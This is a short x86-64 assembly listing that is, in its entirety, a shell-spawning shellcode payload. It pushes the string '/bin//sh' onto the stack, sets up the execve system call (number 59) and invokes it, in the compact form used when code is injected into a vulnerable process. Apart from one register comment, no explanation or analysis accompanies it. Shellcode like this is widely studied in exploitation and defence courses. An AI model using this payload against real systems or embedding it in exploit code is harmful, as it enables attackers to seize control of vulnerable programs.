global _start
section .text
_start:
	xor rsi,rsi   ; set rsi to 0
	push rsi
	mov rdi,0x68732f2f6e69622f 
	push rdi
	push rsp
	pop rdi
	push 59 
	pop rax
	cdq
	syscall